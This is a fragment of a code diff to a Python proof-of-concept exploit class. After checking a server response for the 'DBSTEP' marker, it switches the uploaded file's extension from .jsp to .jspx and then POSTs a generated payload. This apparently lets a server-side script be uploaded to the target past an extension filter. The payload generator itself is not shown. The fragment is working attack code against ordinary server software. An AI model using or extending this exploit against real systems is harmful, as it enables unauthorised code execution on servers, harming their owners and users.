@@ -33,7 +33,7 @@ class POC():
         }
         r=request(**req)
         if r!=None and b"DBSTEP" in r.content:
-            random_str=get_random_str(5)+".jsp"
+            random_str=get_random_str(5)+".jspx"
             req["method"]="POST"
             req["data"]=self.generate_payload(random_str)
             r1=request(**req)
